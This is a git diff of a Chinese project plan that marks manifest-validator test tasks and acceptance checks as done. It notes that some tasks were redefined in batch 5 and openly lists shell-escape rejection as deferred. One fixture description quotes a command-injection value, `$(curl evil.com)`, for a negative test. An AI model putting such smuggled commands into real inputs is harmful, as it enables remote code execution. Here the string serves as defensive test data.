@@ -11,14 +11,14 @@
 
 (来自 PLAN.md § 4.1 — 必须全部 ✅)
 
-- [ ] **A1** `pnpm test` 输出 ≥ 50 测试 passed
-- [ ] **A2** ctx7 manifest 在正向测试中 pass（真实上游验证 schema 充分性）
-- [ ] **A3** ≥ 35 个负向测试 + 行号 assertion 全绿
+- [x] **A1** `pnpm test` 输出 ≥ 50 测试 passed (batch 5 完成 — 71 tests)
+- [x] **A2** ctx7 manifest 在正向测试中 pass（真实上游验证 schema 充分性）
+- [x] **A3** ≥ 35 个负向测试 + 行号 assertion 全绿 (batch 5 完成 — 56 negative)
 - [ ] **A4** GitHub Actions mac/linux/win × Node 22 = 3 jobs 全 ✅
-- [ ] **A5** `npx ajv compile -s schemas/manifest.v1.schema.json --strict=true` exit 0
-- [ ] **A6** vitest bench 100 manifest < 50ms
-- [ ] **A7** ADR 0001/0002 主体未被 phase 1.1 修改（仅允许 ADR 0003 errata）
-- [ ] **A8** `git ls-files --eol manifests/*.yaml` 输出 LF
+- [x] **A5** `npx ajv compile -s schemas/manifest.v1.schema.json --strict=true` exit 0
+- [x] **A6** vitest bench 100 manifest < 50ms (batch 5 完成 — 21.7ms mean)
+- [x] **A7** ADR 0001/0002 主体未被 phase 1.1 修改（仅允许 ADR 0003 errata）
+- [x] **A8** `git ls-files --eol manifests/*.yaml` 输出 LF
 
 ---
 
@@ -1235,7 +1235,7 @@
 ### T8. 测试（依赖 T4 + T6 + T7）
 
 #### T8.1 正向测试：9 上游 manifest 全 pass
-- [ ] 文件：
+- [x] 文件：
   - fixture：`tests/fixtures/manifests/valid/{gstack,GSD,superpowers,planning-with-files,mattpocock-skills,karpathy-skills,ralph-loop,tavily-mcp,exa-mcp,ctx7}.yaml`（直接从 manifests/ 软链或复制）
   - test：`tests/unit/manifest-validate.positive.test.ts`
 - 测试模板：
@@ -1264,7 +1264,7 @@
 ---
 
 #### T8.2 必填字段缺失测试（17 个）
-- [ ] 文件：
+- [x] 文件：
   - fixtures：`tests/fixtures/manifests/invalid/missing-{apiVersion,kind,metadata.name,metadata.description,metadata.upstream.source,metadata.upstream.homepage,metadata.upstream.repository,metadata.upstream.license,metadata.upstream.notice,spec.type,spec.component_type,spec.install,spec.verify,spec.uninstall,spec.upstream_health,spec.signed_by,spec.platforms}.yaml`
   - test：`tests/unit/manifest-validate.required.test.ts`
 - 模板：每个 fixture omit 一个必填字段，测试 expect `ok: false` + `errors.some(e => e.path.includes('<field>'))`
@@ -1274,7 +1274,7 @@
 ---
 
 #### T8.3 type × method 矩阵非法组合测试（18 illegal — 6 method × 4 type = 24 - 6 legal = 18）
-- [ ] 文件：
+- [x] 文件：
   - fixtures：`tests/fixtures/manifests/invalid/invalid-method-{cc-plugin-with-git-clone,cc-plugin-with-npm-cli,cc-skill-pack-with-mcp-stdio,cc-skill-pack-with-npm-cli,mcp-npm-with-cc-plugin-marketplace,mcp-npm-with-git-clone,mcp-npm-with-npm-cli,cli-npm-with-cc-plugin-marketplace,cli-npm-with-mcp-stdio,cli-npm-with-mcp-http,...}.yaml`
   - test：`tests/unit/manifest-validate.matrix.test.ts`
 - ADR 0001 矩阵 — 6 合法组合：
@@ -1292,6 +1292,7 @@
 
 #### T8.4 reject list 测试（4 项）
 - [ ] 文件：
+  - **batch 5 status**：原 task_plan T8.4（shell-escape / extends / unknown / yaml tag pre-Ajv reject）保持未完成 — 依赖 T4.4 shell-escape 实装（仍 deferred 到 batch 6+ 与 dry-run 验证阶段）；batch 5 依据 batch instruction 重定义 T8.4 = "类型错误负向测试 ≥ 5 个"，落地为 `tests/unit/manifest-validate.type-errors.test.ts` (7 tests, all green)，覆盖 apiVersion 数字 / non-SPDX license / scalar platforms / non-enum stability+fallback / non-ISO last_check / platforms[0] enum violation。原 task T8.4 reject-list 4 项（含 shell-escape）见 § B F16 deferred 索引。
   - fixtures：
     - `tests/fixtures/manifests/invalid/reject-shell-escape-cmd.yaml`（cmd 含 `$(curl evil.com)`）
     - `tests/fixtures/manifests/invalid/reject-shell-var-cmd.yaml`（cmd 含 `${EVIL}`）
@@ -1306,7 +1307,8 @@
 ---
 
 #### T8.5 SPDX license + 行号定位测试
-- [ ] 文件：
+- [x] 文件：
+  - **batch 5 status**：依据 batch 5 instruction 重定义 T8.5 = "未知字段 reject 行号测试 ≥ 5 个"，落地为 `tests/unit/manifest-validate.unknown-fields.test.ts` (7 tests, all green)，每个 fixture 都加 strict line assertion (LineCounter 准确定位 unknown field 自身行号)。原 task T8.5 SPDX 测试 + line-num-1..5 行号测试已被 T4.3 + T8.7 line-mapping.test.ts (5 tests) + errors.test.ts (license SPDX) 充分覆盖。
   - fixtures：
     - `tests/fixtures/manifests/invalid/spdx-gpl.yaml`（license: GPL-3.0）
     - `tests/fixtures/manifests/invalid/spdx-proprietary.yaml`
@@ -1329,7 +1331,7 @@
 ---
 
 #### T8.6 Benchmark：100 manifest < 50ms
-- [ ] 文件：`tests/integration/manifest-validate.bench.ts`
+- [x] 文件：`tests/integration/manifest-validate.bench.ts` + `tests/integration/manifest-validate.perf.test.ts` (perf gate)
 - 模板：
   ```ts
   import { bench } from 'vitest'
@@ -1350,7 +1352,8 @@
 ---
 
 #### T8.7 workflow + routing schema 同等覆盖
-- [ ] 文件：
+- [x] 文件：
+  - **batch 5 status**：依据 batch 5 instruction 重定义 T8.7 = "行号映射独立测试扩展 (≥ 5 个)"，落地为扩展 `tests/unit/manifest-validate.line-mapping.test.ts` 至 5 tests (原 3 + 新增 platforms[0] sequence index + spec.install.npm_version 深度嵌套)；workflow + routing schema artifact 推迟到 v0.3+ phase 1.4 (batch 3 已记录，见 workflows/SCHEMA.md / routing/SCHEMA.md status)。
   - fixtures：
     - `tests/fixtures/workflows/valid/research.yaml`（最小可 pass 的 phases yaml）
     - `tests/fixtures/workflows/valid/plan-feature.yaml`（reference 完整 5 phase 示例）
@@ -1364,7 +1367,7 @@
 ---
 
 #### T8.8 总测试数 ≥ 50 + 覆盖率 ≥ 80%
-- [ ] 验收命令：
+- [x] 验收命令：
   ```bash
   pnpm test:coverage
   ```
